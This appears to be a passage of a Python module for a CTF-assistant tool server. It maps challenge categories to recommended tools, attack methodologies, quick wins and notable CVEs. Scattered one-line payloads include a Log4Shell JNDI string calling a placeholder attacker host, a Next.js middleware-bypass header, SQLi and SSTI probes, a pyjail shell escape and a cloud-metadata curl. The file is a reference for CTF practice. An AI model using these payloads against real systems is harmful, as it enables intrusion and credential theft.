"""CTF challenge-type to module/tool mapping with curated suggestions."""

from __future__ import annotations

import shutil
import sys
from pathlib import Path
from typing import Optional

_parent = str(Path(__file__).resolve().parent.parent)
if _parent not in sys.path:
    sys.path.insert(0, _parent)

from mcp_server.tools_db import ToolsDatabase  # noqa: E402

# Display name → tools_config.json registry name.
# Only needed when the user-facing name differs from the registry entry.
# Tools not listed here are assumed to match the registry name exactly.
TOOL_ALIASES: dict[str, str] = {
    # Case mismatches
    "cyberchef": "CyberChef",
    "responder": "Responder",
    "rsactftool": "RsaCtfTool",
    "seclists": "SecLists",
    "theharvester": "theHarvester",
    # Naming mismatches (display name → registry name)
    "jwt-tool": "jwt_tool",
    "afl++": "AFLplusplus",
    "upx": "upx-ucl",
    "exiftool": "libimage-exiftool-perl",
    "wireshark": "wireshark-common",
    "netcat": "netcat-openbsd",
    "wifite": "wifite2",
    "hashid": "hashid",
    "snow": "stegsnow",
    # Sub-components (display name → parent tool in registry)
    "photorec": "testdisk",
}

# Maps challenge type → description, relevant modules, and top tools with descriptions.
CTF_CATEGORY_MAP: dict[str, dict] = {
    "web": {
        "description": "Web exploitation — SQLi, XSS, SSRF, auth bypass, deserialization, prototype pollution",
        "modules": ["web", "recon", "networking"],
        "tools": [
            ("mitmproxy", "Intercepting HTTP/HTTPS proxy"),
            ("sqlmap", "Automatic SQL injection exploitation"),
            ("nikto", "Web server vulnerability scanner"),
            ("gobuster", "Directory/DNS/vhost brute-forcing"),
            ("ffuf", "Fast web fuzzer"),
            ("httpx", "Fast HTTP toolkit for probing"),
            ("nuclei", "Template-based vulnerability scanner"),
            ("whatweb", "Web technology fingerprinting"),
            ("feroxbuster", "Fast content discovery tool"),
            ("arjun", "HTTP parameter discovery"),
            ("jwt-tool", "JWT token testing and exploitation"),
            ("dalfox", "XSS parameter analysis and scanning"),
        ],
        "methodology": [
            "1. RECON: whatweb/httpx for tech stack + headers, ffuf/gobuster for hidden paths",
            "2. ENUMERATE: robots.txt, .git/HEAD, .env, backup files, API endpoints, JS bundles",
            "3. ANALYZE: Read JS source — grep for server action IDs, API keys, internal hostnames, "
            "hidden routes. Check /_next/static/<buildId>/_buildManifest.js for route map. "
            "Look for .hint files, env vars leaking internal service names",
            "4. EXPLOIT: SQLi (sqlmap), XSS (dalfox), SSRF, SSTI, deserialization, "
            "prototype pollution, JWT manipulation, insecure file uploads. "
            "If WAF/blacklist blocks: encoding (URL, double-URL, Unicode), string concat, "
            "alternate built-ins, case tricks, comment injection",
            "5. ESCALATE: After initial access, check env vars and filesystem for internal "
            "service hostnames/ports, then pivot via SSRF or RCE to reach them",
        ],
        "quick_wins": [
            "Check robots.txt, /.git/HEAD, .env, /graphql, /swagger.json, common key endpoints",
            "Test ' OR 1=1-- in all input fields",
            "Try admin:admin, admin:password on login forms",
            "If JWT cookie/header: decode payload, try alg:none and algorithm confusion attacks",
            "SSTI: test {{7*7}} / ${7*7} in text inputs — if evaluated, identify engine and escalate",
            "Read all JS bundles — search for hardcoded secrets, action IDs, internal URLs",
            "If Docker: check /.dockerenv, env vars, /etc/hosts for internal services",
        ],
        "notable_cves": [
            "CVE-2025-55182 — React2Shell: RCE via React Server Components Flight protocol. "
            "Craft multipart POST with prototype pollution payload (__proto__/constructor chain) "
            "to reach Function constructor. Hits any Next.js/React RSC endpoint with server actions. "
            "WAF bypass: split 'child_process' via string concat, use spawnSync instead of execSync",
            "CVE-2025-29927 — Next.js middleware bypass: header 'x-middleware-subrequest: "
            "middleware:middleware:middleware:middleware:middleware' skips all middleware checks. "
            "Exposes auth-protected routes. Affects Next.js <15.2.3, <14.2.25",
            "CVE-2021-44228 — Log4Shell: Java RCE via JNDI injection in log messages. "
            "Payload: ${jndi:ldap://attacker/a}. Test in User-Agent, headers, form fields",
            "CVE-2021-22204 — Exiftool RCE via DjVu metadata. Upload crafted image, "
            "triggers code execution when server runs exiftool on it",
            "CVE-2023-46747 — F5 BIG-IP auth bypass: unauthenticated RCE via /mgmt/tm/util/bash",
            "CVE-2019-11043 — PHP-FPM RCE via path_info: send \\n in URL to corrupt FPM buffer. "
            "Targets nginx + php-fpm with specific try_files/fastcgi_split_path_info config",
        ],
    },
    "crypto": {
        "description": "Cryptography — cipher analysis, RSA attacks, hash cracking, encoding, side-channel (CPA/DPA)",
        "modules": ["crypto", "cracking"],
        "tools": [
            ("z3-solver", "SMT solver for constraint problems"),
            ("rsactftool", "RSA attack toolkit"),
            ("hashcat", "Advanced hash cracking (GPU)"),
            ("john", "John the Ripper password cracker"),
            ("xortool", "XOR cipher analysis"),
            ("factordb-python", "Integer factorization database client"),
            ("hashid", "Hash type identification"),
            ("name-that-hash", "Hash identification tool"),
            ("lascar", "Side-channel analysis framework (CPA, DPA, template attacks)"),
        ],
        "methodology": [
            "1. IDENTIFY: Use hashid/name-that-hash, check encoding (base64, hex, rot13)",
            "2. ANALYZE: Find key length (xortool), RSA parameters (n, e, c), cipher type",
            "3. CLASSICAL: RSA (RsaCtfTool, factordb), XOR (xortool), hash (hashcat/john)",
            "4. MODERN: Lattice attacks (LLL/BKZ via SageMath/fpylll) for knapsack, hidden number, "
            "ECDSA nonce reuse/bias. Padding oracle (byte-at-a-time decrypt). "
            "Elliptic curve: invalid curve, small subgroup, twist attacks",
            "5. SIDE-CHANNEL: Load power traces as numpy arrays, identify POI (sample with highest "
            "variance across key guesses), use correlation (CPA) or difference-of-means (DPA) "
            "to recover secret",
            "6. SOLVE: Use run_script with z3 for constraints, PyCryptodome for custom crypto, "
            "SageMath for number theory (lattice reduction, polynomial rings, ECC math)",
            "7. VERIFY: Decrypt and validate output, check for nested encoding",
        ],
        "quick_wins": [
            "Try base64 -d, xxd -r, rot13 on ciphertext",
            "Check if RSA n is factorable via factordb",
            "RSA: check for small e with small plaintext (cube root attack), "
            "shared primes across multiple n values (GCD), Wiener's for large e/small d",
            "Test common ciphers: Caesar, Vigenere, XOR with known plaintext",
            "Run hashcat/john with rockyou.txt on unknown hashes",
            "ECDSA: if two signatures share nonce (same r value), recover private key instantly",
            "Padding oracle: if server leaks padding validity, decrypt ciphertext byte-by-byte",
            "Side-channel: correlate power traces with Hamming weight of intermediate values per key guess",
        ],
    },
    "pwn": {
        "description": "Binary exploitation — buffer overflows, ROP chains, format strings, "
        "heap exploits, custom VM/allocator",
        "modules": ["pwn", "reversing"],
        "tools": [
            ("pwntools", "CTF framework for exploit development"),
            ("gdb", "GNU debugger (with pwndbg/GEF)"),
            ("pwndbg", "GDB plugin for exploit development"),
            ("ropper", "ROP gadget finder"),
            ("one_gadget", "One-shot execve gadget finder"),
            ("seccomp-tools", "Seccomp sandbox analysis"),
            ("boofuzz", "Network protocol fuzzer"),
            ("afl++", "Coverage-guided fuzzer"),
            ("checksec", "Binary security property checker"),
            ("pwninit", "Auto-setup: patches binary with correct libc/ld for local testing"),
            ("ROPgadget", "ROP gadget search tool"),
        ],
        "methodology": [
            "1. RECON: checksec for protections (NX, PIE, canary, RELRO), file/readelf for type",
            "2. ANALYZE: objdump/radare2 for disassembly, find vulnerable function (gets, strcpy, printf)",
            "3. FIND PRIMITIVES: Buffer overflow offset (cyclic), format string leaks, heap bugs",
            "4. HEAP: glibc heap — tcache poisoning (overwrite fd pointer), fastbin dup "
            "(double-free), unsorted bin attack (leak libc via fd/bk), house-of techniques. "
            "Map chunk layout with heap commands in pwndbg/GEF. "
            "Custom allocator? Map header fields, freelist structure, coalescing logic",
            "5. CUSTOM VM: Identify opcode table, stack effects, type system. "
            "Test each instruction empirically. Look for UAF (refcount bugs), "
            "type confusion, missing bounds checks, double-free",
            "6. BUILD EXPLOIT: run_script with pwntools — ROP chain, shellcode, "
            "ret2libc, GOT overwrite, heap spray, tcache poison → arbitrary write",
            "7. EXPLOIT: Connect to target, send payload, handle interaction, capture the flag",
        ],
        "quick_wins": [
            "Run checksec to see which protections are missing",
            "Try cyclic(200) + core dump to find offset",
            "Check for format string: %p%p%p%p in input",
            "Heap: use pwndbg 'vis_heap_chunks' or GEF 'heap chunks' to visualize layout",
            "Look for win/flag function in symbols (nm/objdump)",
            "Custom allocator: map chunk header (size/flags/fd/bk), look for off-by-one or overflow into next header",
            "Custom VM: use built-in assembler/disassembler if present. "
            "Test each opcode to discover exact stack effects",
            "pwninit to auto-patch binary with challenge libc/ld for local testing",
        ],
    },
    "reversing": {
        "description": "Reverse engineering — disassembly, decompilation, crackmes, cross-arch, custom VM/bytecode",
        "modules": ["reversing"],
        "tools": [
            ("ghidra", "NSA RE framework (GUI — download from ghidra-sre.org, run on Windows)"),
            ("radare2", "RE framework and hex editor"),
            ("rizin", "Fork of radare2 with improved APIs"),
            ("binwalk", "Firmware analysis and extraction"),
            ("strace", "System call tracer"),
            ("ltrace", "Library call tracer"),
            ("upx", "UPX packer/unpacker"),
            ("angr", "Binary analysis framework"),
            ("uncompyle6", "Python bytecode decompiler"),
            ("checksec", "Binary security property checker"),
            ("frida-tools", "Dynamic instrumentation for runtime analysis"),
        ],
        "methodology": [
            "1. IDENTIFY: file for arch + linking + stripped status. strings for flag format, "
            "error messages, decoy strings. Non-x86? Use qemu-<arch> for dynamic analysis",
            "2. MAP STRUCTURE: Use r2/rizin via run_tool for CLI disassembly. "
            "For GUI analysis: download Ghidra from ghidra-sre.org (Java, cross-platform) "
            "and open the binary on the Windows host. "
            "List functions, trace entry → main, follow string xrefs to key functions",
            "3. FIND THE CHECK: Work backwards from success/failure strings to the validation "
            "logic. Watch for decoys (fake comparisons before the real check), multi-stage "
            "validation, and indirect calls",
            "4. ANALYZE TRANSFORMS: XOR (static key, rolling key, multi-byte), lookup tables, "
            "custom hashing, S-boxes, RC4-like streams. Identify the loop structure, "
            "extract encoded data, reverse the transform in Python",
            "5. NON-C BINARIES: Java/Android → jadx (CLI via run_tool) or "
            "jadx-gui (download from github.com/skylot/jadx/releases, run on Windows). "
            ".NET → ILSpy (download from github.com/icsharpcode/ILSpy/releases, Windows GUI) "
            "or ilspycmd (CLI, install via: dotnet tool install ilspycmd -g). "
            "Go → look for runtime.main, strings embedded in binary. "
            "Rust → similar to C, look for core::fmt patterns. "
            "Python → uncompyle6/pycdc for .pyc (CLI, via run_tool/run_script)",
            "6. HANDLE ANTI-RE: Timing checks, debugger detection (ptrace/IsDebuggerPresent), "
            "obfuscated control flow, self-modifying code, VM-based protection. "
            "Often simpler to extract the algorithm statically than to bypass all checks",
            "7. CUSTOM VM/BYTECODE: Identify dispatch loop (switch/jump table on opcode byte). "
            "Map every opcode: name, operand encoding (LEB128? fixed-width?), stack effect (push/pop count). "
            "Check for type system (int vs buffer vs closure). Test instructions empirically — "
            "do NOT assume semantics. Look for: missing refcount on DUP, UAF via GC, type confusion in CALL",
        ],
        "quick_wins": [
            "strings | grep for flag format — multiple hits may indicate decoys",
            "Non-x86 (ARM/RISC-V/MIPS)? qemu-<arch> to run, qemu -strace for syscall trace",
            "ltrace to see strcmp/memcmp with expected input (instant solve if not stripped)",
            "CLI: r2 -A binary → afl (functions), axt (xrefs), pdf (disasm). "
            "GUI: open in Ghidra on Windows for decompiler view",
            "Check if packed: UPX (upx -d), custom packers (high entropy sections)",
            "Go binary? strings are embedded — grep for flag format directly. "
            "Java .jar? unzip + jadx. Python .pyc? uncompyle6/pycdc",
            "frida-trace to hook specific functions at runtime without full debugger setup",
            "Custom VM: find dispatch loop (large switch or jump table), extract opcode→handler mapping, "
            "test each opcode with minimal programs to discover exact behavior before attempting exploit",
        ],
    },
    "forensics": {
        "description": "Digital forensics — disk/memory analysis, file carving, network forensics, USB HID, timeline",
        "modules": ["forensics"],
        "tools": [
            ("volatility3", "Memory forensics framework"),
            ("autopsy", "Digital forensics GUI (download from sleuthkit.org, run on Windows)"),
            ("sleuthkit", "Filesystem forensics toolkit"),
            ("foremost", "File carving tool"),
            ("binwalk", "Firmware and file extraction"),
            ("exiftool", "Metadata extraction"),
            ("oletools", "Microsoft Office file analysis"),
            ("peepdf-3", "PDF analysis framework"),
            ("hachoir", "Binary stream analysis"),
            ("photorec", "File recovery / carving"),
            ("bulk-extractor", "Bulk data extraction"),
            ("usbrip", "USB event history forensics"),
        ],
        "methodology": [
            "1. IDENTIFY: file, xxd, binwalk for file type and embedded data",
            "2. EXTRACT: binwalk -e, foremost, photorec for file carving",
            "3. MEMORY: volatility3 for memory dumps — pslist, filescan, dumpfiles, "
            "hashdump, netscan. Profile detection: windows.info or linux.bash",
            "4. DISK: sleuthkit (fls, icat) for filesystem analysis, deleted file "
            "recovery (extundelete/ext4magic), timeline (mactime)",
            "5. WINDOWS: Registry hives (RegRipper, regipy) — SAM for users, "
            "SYSTEM for services, NTUSER.DAT for MRU/recent. Event logs "
            "(chainsaw/evtx) — Security.evtx for logons, PowerShell logs "
            "for commands. Prefetch for execution timeline",
            "6. METADATA: exiftool, oletools for Office macros, peepdf for PDF",
            "7. USB/HID: tshark to extract usb.capdata from PCAPs, USB-HID-decoders for keyboard/mouse reconstruction",
            "8. RECONSTRUCT: run_script for custom parsers, timeline analysis, data recovery",
        ],
        "quick_wins": [
            "Run binwalk -e for automatic extraction of embedded files",
            "Check exiftool for hidden metadata and comments",
            "Use strings | grep -i flag on the entire file",
            "Try foremost for file carving from disk/memory dumps",
            "Memory dump: volatility3 windows.hashdump + windows.filescan for quick password hashes and file listing",
            "Windows registry: RegRipper on SAM/SYSTEM/NTUSER.DAT hives "
            "for user accounts, services, and recent activity",
            "USB keyboard PCAP: extract usb.capdata with tshark, decode with "
            "USB-HID-decoders or ctf-usb-keyboard-parser",
        ],
        "notable_cves": [
            "CVE-2021-22204 — Exiftool RCE via DjVu metadata: upload a crafted .djvu/.jpg "
            "that triggers command execution when the server parses metadata with exiftool. "
            "Common in file upload challenges where the server processes metadata",
            "CVE-2022-4510 — Binwalk path traversal RCE: crafted PFS filesystem in firmware "
            "image can write arbitrary files during extraction (binwalk <2.3.4)",
        ],
    },
    "stego": {
        "description": "Steganography — hidden data in images, audio, text, and network protocols",
        "modules": ["stego"],
        "tools": [
            ("steghide", "Hide/extract data in images and audio"),
            ("stegseek", "Fast steghide cracker"),
            ("zsteg", "PNG/BMP steganography detector"),
            ("stegsolve", "Image steganography analysis"),
            ("openstego", "Digital watermarking and data hiding"),
            ("exiftool", "Image metadata analysis"),
            ("stegoveritas", "Multi-tool stego analyzer"),
            ("snow", "Whitespace steganography tool"),
            ("sonic-visualiser", "Audio spectrogram and waveform analysis"),
            ("pngcheck", "PNG file structure validation and diagnostics"),
        ],
        "methodology": [
            "1. IDENTIFY: file, exiftool for file type and metadata, pngcheck for PNG validation",
            "2. VISUAL (IMAGE): stegsolve (GUI — download JAR from "
            "github.com/Giotino/stegsolve, run: java -jar stegsolve.jar on Windows) "
            "for bit-plane analysis. Check each RGB/alpha plane separately. "
            "CLI alternative: run_script with PIL to extract individual bit planes",
            "3. AUDIO (GUI on Windows): Download sonic-visualiser from sonicvisualiser.org "
            "or use Audacity (audacityteam.org). Open file, switch to spectrogram view "
            "— hidden images/text in spectrograms are extremely common in CTF. "
            "Check for DTMF tones (phone dialing), morse code in waveform, SSTV signals. "
            "Try different spectrogram scales (linear, log, mel). "
            "CLI alternative: run_script with scipy/matplotlib to generate spectrogram",
            "4. EXTRACT: steghide extract, zsteg, binwalk for embedded data. "
            "Audio: extract LSB from WAV samples with run_script",
            "5. CRACK: stegseek with wordlist if steghide is password-protected",
            "6. CUSTOM: run_script for LSB extraction (image or audio), "
            "pixel value manipulation, custom stego algorithms",
        ],
        "quick_wins": [
            "Run exiftool for hidden comments and metadata",
            "Try steghide extract -sf image.jpg -p '' (empty password)",
            "Use zsteg on PNG/BMP for LSB data",
            "Check strings for embedded text or flag",
            "Audio file? Open spectrogram on Windows (sonic-visualiser or Audacity) — "
            "hidden images in spectrogram are extremely common in CTF",
            "WAV file with unusual size? Check LSB of audio samples for "
            "hidden data (each sample's least significant bit)",
            "Multiple images? Check for visual differences — XOR or diff two images to reveal hidden data",
        ],
    },
    "misc": {
        "description": "Miscellaneous CTF — encoding, pyjail, sandbox escape, "
        "scripting, cracking, privilege escalation",
        "modules": ["misc", "cracking"],
        "tools": [
            ("cyberchef", "Data transformation Swiss army knife"),
            ("hashcat", "Advanced GPU hash cracker"),
            ("john", "John the Ripper password cracker"),
            ("hydra", "Online brute-force tool"),
            ("crunch", "Wordlist generator"),
            ("arsenal-cli", "Cheatsheet tool for pentesters"),
            ("seclists", "Security wordlists collection"),
            ("patator", "Multi-purpose brute-forcer"),
        ],
        "methodology": [
            "1. IDENTIFY: file, strings, xxd to understand what you're working with",
            "2. DECODE: Try common encodings — base64, hex, URL, rot13, morse, "
            "multi-layer encoding (base64 of hex of rot13, etc.)",
            "3. PYJAIL/SANDBOX ESCAPE: Identify blocked builtins/keywords. "
            "Bypass via: __class__.__mro__[1].__subclasses__() to find "
            "os._wrap_close or subprocess.Popen, chr() to build strings "
            "without quotes, getattr() for attribute access, "
            "exec(bytes([...])) to bypass keyword filters. "
            "Check: breakpoint(), help(), license() for interactive shells",
            "4. PRIV-ESC (if shell access): sudo -l for allowed commands, "
            "SUID binaries (find / -perm -4000), capabilities (getcap), "
            "cron jobs, writable PATH dirs, kernel exploits. "
            "Check GTFOBins for exploit methods per binary",
            "5. CRACK: hashcat/john with rockyou.txt, hydra for online brute-force",
            "6. SCRIPT: run_script for custom decode chains, brute-force, race conditions, timing attacks",
            "7. COMBINE: Combine findings from multiple steps, think laterally",
        ],
        "quick_wins": [
            "Try CyberChef Magic function for automatic decoding",
            "Run base64 -d, xxd -r, and rot13 on unknown data",
            "Use john/hashcat with rockyou.txt on hashes",
            "Pyjail: try __import__('os').system('sh'), eval(), exec(), breakpoint(), help() first",
            "Priv-esc: sudo -l, find / -perm -4000 2>/dev/null, check /etc/crontab and writable PATH directories",
            "QR code? Use zbarimg or pyzbar to decode. Braille/morse/semaphore? Look up encoding table",
        ],
    },
    "networking": {
        "description": "Network challenges — packet analysis, protocol exploitation, "
        "traffic manipulation, covert channels",
        "modules": ["networking", "pwn", "enterprise"],
        "tools": [
            ("wireshark", "Network protocol analyzer (GUI — run on Windows host)"),
            ("tshark", "CLI packet analyzer (use via run_tool in WSL)"),
            ("nmap", "Network scanner and service detection"),
            ("tcpdump", "Command-line packet capture"),
            ("scapy", "Packet manipulation framework"),
            ("netcat", "Network utility for reading/writing connections"),
            ("socat", "Multipurpose relay / socket tool"),
            ("masscan", "Fast port scanner"),
            ("responder", "LLMNR/NBT-NS/MDNS poisoner"),
            ("mitmproxy", "Intercepting HTTP/HTTPS proxy"),
            ("impacket", "Network protocol exploitation toolkit"),
        ],
        "methodology": [
            "1. METADATA: capinfos for file info, merge history, interface count, capture comments",
            "2. OVERVIEW: tshark -z io,phs for protocol hierarchy, identify unusual protocols",
            "3. ISOLATE: Split large PCAPs by interface/filter: tshark -Y 'filter' -w /tmp/subset.pcap",
            "4. ANALYZE: Follow TCP streams, extract files, check for covert "
            "channels (timing, ICMP, DNS). Look for unusual protocols "
            "(ICMP with data, DNS with long subdomains, HTTP with odd headers)",
            "5. DNS EXFIL/TUNNELING: Extract DNS query names — long hex/base64 "
            "subdomains indicate exfiltration. Reassemble: strip domain suffix, "
            "concatenate labels, base64/hex decode. TXT records may carry data "
            "in responses. Tools: tshark -Y dns -T fields -e dns.qry.name",
            "6. PROTOCOL EXPLOIT: Replay attacks (scapy), credential capture "
            "(responder, impacket), MITM (mitmproxy, bettercap). "
            "Custom protocols: reverse the framing, write parser in run_script",
            "7. DECODE: run_script for timing analysis, payload reconstruction, protocol-specific parsing",
        ],
        "quick_wins": [
            "Run capinfos first — reveals merge history, capture comments, and hidden metadata",
            "Use tshark -z io,phs for instant protocol overview on any size PCAP",
            "Check for covert channels: unusual timing patterns, ICMP data, DNS TXT exfil",
            "Follow TCP streams: tshark -r file.pcap -z follow,tcp,ascii,0",
            "DNS exfil: tshark -Y dns -T fields -e dns.qry.name | sort -u "
            "— look for hex/base64 encoded subdomain labels",
            "Check DNS queries in PCAP for exfiltrated data",
            "Extract files: tshark -r file.pcap --export-objects http,/tmp/out or foremost on raw TCP payload",
        ],
        "notable_cves": [
            "CVE-2014-0160 — Heartbleed: OpenSSL TLS heartbeat buffer over-read. "
            "Leaks up to 64KB of server memory per request (keys, session data). "
            "Common in PCAP forensics — look for heartbeat requests with large payload length",
            "CVE-2020-1350 — SIGRed: Windows DNS Server RCE via crafted SIG record. "
            "Wormable, affects all Windows Server DNS versions",
        ],
    },
    "wireless": {
        "description": "Wireless security — WiFi cracking, Bluetooth exploitation, SDR",
        "modules": ["wireless", "networking"],
        "tools": [
            ("aircrack-ng", "WiFi security auditing suite"),
            ("kismet", "Wireless network detector/sniffer"),
            ("bettercap", "MITM and network attack tool"),
            ("wifite", "Automated WiFi cracking"),
            ("reaver", "WPS brute-force attack tool"),
            ("fluxion", "WiFi social engineering tool"),
            ("bluez", "Bluetooth protocol stack"),
            ("hackrf", "SDR tools for HackRF"),
            ("gnuradio", "Signal processing framework"),
        ],
        "methodology": [
            "1. DISCOVER: airmon-ng for monitor mode, kismet for network scanning",
            "2. CAPTURE: airodump-ng for handshake capture, tcpdump for raw packets",
            "3. CRACK: aircrack-ng/hashcat on WPA handshake, reaver for WPS",
            "4. BLE: Scan with bluetoothctl/hcitool lescan, enumerate services "
            "with gatttool. Read/write GATT characteristics. Sniff BLE traffic "
            "with Ubertooth or nRF Sniffer. Crack BLE pairing with crackle",
            "5. MITM: bettercap for ARP spoofing and BLE MITM, mitmproxy for HTTP intercept",
            "6. SDR: HackRF/RTL-SDR for signal capture, GNURadio for "
            "demodulation. Common targets: car key fobs, garage doors, "
            "weather stations, pagers (POCSAG/FLEX)",
        ],
        "quick_wins": [
            "Run wifite for automated WiFi attacks",
            "Check for WPS with wash/reaver",
            "Use aircrack-ng with rockyou.txt on captured handshake",
            "BLE: bluetoothctl → scan on → list devices → connect → enumerate characteristics and read values",
            "PCAP with BLE? Open in Wireshark on Windows, filter btatt, "
            "look for Read/Write Request values containing flag data",
        ],
    },
    "osint": {
        "description": "Open Source Intelligence — social media, domain, email, and people reconnaissance",
        "modules": ["recon"],
        "tools": [
            ("sherlock-project", "Username search across social networks"),
            ("theharvester", "Email/subdomain/IP harvester"),
            ("recon-ng", "OSINT reconnaissance framework"),
            ("spiderfoot", "OSINT automation"),
            ("amass", "Attack surface mapping"),
            ("subfinder", "Subdomain discovery"),
            ("shodan", "Shodan CLI for internet-wide scanning"),
            ("holehe", "Email to social media account checker"),
            ("maigret", "Username search across 2500+ sites"),
            ("maltego-trx", "Maltego transform SDK"),
        ],
        "methodology": [
            "1. TARGET: Define scope — username, domain, email, organization",
            "2. ENUMERATE: sherlock/maigret for usernames, amass/subfinder for subdomains",
            "3. HARVEST: theHarvester for email/IP, holehe for account checking",
            "4. IMAGE OSINT: exiftool for GPS coordinates, camera model, timestamps. "
            "Reverse image search (Google Images, TinEye, Yandex). "
            "Identify landmarks, street signs, vegetation for geolocation",
            "5. CORRELATE: Cross-reference findings, build relationship map",
            "6. DEEP DIVE: Shodan for exposed services, wayback machine for "
            "history, certificate transparency (crt.sh) for subdomain discovery",
        ],
        "quick_wins": [
            "Run sherlock/maigret on usernames for social media",
            "Use subfinder + httpx for fast subdomain scanning",
            "Check Shodan for exposed services on target IP",
            "Search wayback machine for old/deleted pages",
            "Image with GPS? exiftool -gps:all for exact coordinates",
            "Check crt.sh for certificate transparency subdomain discovery",
        ],
    },
    "cloud": {
        "description": "Cloud security — AWS/Azure/GCP exploitation, container escapes, IAM abuse",
        "modules": ["cloud", "containers", "recon"],
        "tools": [
            ("scoutsuite", "Multi-cloud security auditing"),
            ("prowler", "AWS/Azure/GCP security assessments"),
            ("pacu", "AWS exploitation framework"),
            ("cloudfox", "Cloud penetration testing"),
            ("trufflehog", "Secret scanning in code/cloud"),
            ("trivy", "Container vulnerability scanner"),
            ("kube-hunter", "Kubernetes penetration testing"),
            ("deepce", "Docker enumeration and escape"),
            ("cloudsplaining", "AWS IAM policy analyzer"),
        ],
        "methodology": [
            "1. ENUMERATE: Find cloud services, S3 buckets, IAM roles, metadata endpoints",
            "2. SCAN: prowler/scoutsuite for misconfiguration, trivy for container vulns",
            "3. SECRETS: trufflehog for hardcoded keys, check metadata API (169.254.169.254)",
            "4. EXPLOIT: pacu for AWS escalation, deepce for container escape",
            "5. PIVOT: Use discovered access to move laterally in the cloud environment",
        ],
        "quick_wins": [
            "Check metadata endpoint: curl http://169.254.169.254/latest/meta-data/",
            "Run trufflehog on git repo for exposed secrets",
            "Try public S3 bucket enumeration",
            "Check IAM policies for overprivileged roles",
        ],
        "notable_cves": [
            "CVE-2024-21626 — Leaky Vessels: container escape via /proc/self/fd race in runc. "
            "Attacker in container can overwrite host binaries",
            "CVE-2020-15257 — containerd host network namespace: containers with host network "
            "can access containerd shim API and escape to host",
        ],
    },
    "mobile": {
        "description": "Mobile security — Android/iOS app analysis, APK reversing, dynamic testing",
        "modules": ["mobile", "reversing", "forensics", "blueteam", "web"],
        "tools": [
            ("apktool", "APK reverse engineering"),
            ("jadx", "DEX to Java decompiler"),
            ("frida-tools", "Dynamic instrumentation toolkit"),
            ("mvt", "Mobile Verification Toolkit"),
            ("objection", "Runtime mobile exploration"),
            ("androguard", "Android app reverse engineering"),
            ("quark-engine", "Android malware scoring"),
            ("nuclei", "Vulnerability scanner with mobile templates"),
        ],
        "methodology": [
            "1. EXTRACT: apktool d app.apk, jadx for Java decompilation",
            "2. STATIC: Search for hardcoded secrets, API keys, endpoints in source code",
            "3. DYNAMIC: frida/objection for runtime hooking, SSL pinning bypass",
            "4. NETWORK: mitmproxy for API traffic, check for insecure endpoints",
            "5. EXPLOIT: Exploit discovered weaknesses — insecure storage, auth bypass, injection",
        ],
        "quick_wins": [
            "Run apktool d + grep -r 'password\\|secret\\|api_key' on unpacked APK",
            "Use jadx to read Java source code directly",
            "Check AndroidManifest.xml for exported activities/providers",
            "Try frida with objection for SSL pinning bypass",
        ],
        "notable_cves": [
            "CVE-2023-45866 — Bluetooth keystroke injection: unauthenticated "
            "attacker can pair with Android/Linux/iOS devices and inject keystrokes "
            "without user confirmation. Affects Android 4.2+, Linux with BlueZ, iOS/macOS",
            "CVE-2020-0069 — MediaTek-su: privilege escalation on MediaTek Android "
            "devices via /proc/ged interaction. Instant root on affected chipsets",
        ],
    },
    "blockchain": {
        "description": "Blockchain security — smart contract auditing, EVM analysis, DeFi exploits",
        "modules": ["blockchain"],
        "tools": [
            ("slither-analyzer", "Solidity static analyzer"),
            ("mythril", "EVM bytecode security analyzer"),
            ("foundry", "Smart contract development toolkit (forge/cast/anvil)"),
            ("solc-select", "Solidity compiler version manager"),
            ("echidna", "Ethereum smart contract fuzzer"),
            ("halmos", "Symbolic testing for Foundry contracts (a16z)"),
            ("aderyn", "Fast Rust-based Solidity static analyzer (Cyfrin)"),
            ("heimdall-rs", "EVM bytecode decompiler and disassembler"),
            ("crytic-medusa", "Parallelized smart contract fuzzer (Crytic)"),
            ("ityfuzz", "Hybrid fuzzer with flashloan and DeFi support"),
            ("crytic-compile", "Multi-framework compilation abstraction"),
            ("eth-ape", "Python smart contract interaction framework"),
        ],
        "methodology": [
            "1. ANALYZE: Read smart contract code, understand business logic and storage layout",
            "2. DECOMPILE: If no source — heimdall for bytecode decompilation and disassembly",
            "3. STATIC: slither + aderyn for automatic vulnerability scanning, mythril for EVM analysis",
            "4. FUZZ: echidna/medusa for property-based fuzzing, ityfuzz for DeFi-specific bugs",
            "5. SYMBOLIC: halmos for formal verification of Foundry test properties",
            "6. INTERACT: foundry cast for on-chain interaction, eth-ape for Python scripting",
            "7. EXPLOIT: Write exploit contract with foundry, test against local fork (anvil)",
            "8. VERIFY: Confirm vulnerability, document attack vector and impact",
        ],
        "quick_wins": [
            "Run slither + aderyn for automatic detection of common weaknesses",
            "Check for reentrancy, integer overflow, access control, delegatecall issues",
            "Use foundry cast to interact with the contract directly",
            "heimdall decompile for unverified contracts without source code",
            "Check storage layout for delegatecall storage collision vulnerabilities",
        ],
    },
}

# Aliases for category names.
CATEGORY_ALIASES: dict[str, str] = {
    "re": "reversing",
    "rev": "reversing",
    "binary": "pwn",
    "exploitation": "pwn",
    "steganography": "stego",
    "network": "networking",
    "recon": "osint",
    "intelligence": "osint",
    "wifi": "wireless",
    "container": "cloud",
    "kubernetes": "cloud",
    "docker": "cloud",
    "android": "mobile",
    "ios": "mobile",
    "smart-contract": "blockchain",
    "solidity": "blockchain",
    "dfir": "forensics",
    "memory": "forensics",
    "usb": "forensics",
    "hid": "forensics",
    "side-channel": "crypto",
    "power-analysis": "crypto",
    "sca": "crypto",
    "dpa": "crypto",
    "cpa": "crypto",
    "vm": "pwn",
    "bytecode": "reversing",
    "interpreter": "reversing",
    "heap": "pwn",
    "allocator": "pwn",
    "pyjail": "misc",
    "jail": "misc",
    "sandbox": "misc",
    "privesc": "misc",
    "priv-esc": "misc",
    "encoding": "misc",
    "audio": "stego",
    "spectrogram": "stego",
    "ble": "wireless",
    "bluetooth": "wireless",
    "sdr": "wireless",
    "pcap": "networking",
    "packet": "networking",
    "dns": "networking",
    "geolocation": "osint",
    "geoint": "osint",
    "imint": "osint",
    "evm": "blockchain",
    "defi": "blockchain",
}


def resolve_category(challenge_type: str) -> Optional[str]:
    """Resolve a challenge type string to a canonical category name."""
    normalized = challenge_type.lower().strip()
    if normalized in CTF_CATEGORY_MAP:
        return normalized
    return CATEGORY_ALIASES.get(normalized)


def _check_tool_installed(tool_name: str, tools_db: ToolsDatabase) -> tuple[bool, bool]:
    """Check if a tool is installed. Returns (installed, in_registry).

    Uses TOOL_ALIASES to map display names to registry names, and falls
    back to PATH check for tools not in the registry.
    """
    # Resolve display name to registry name
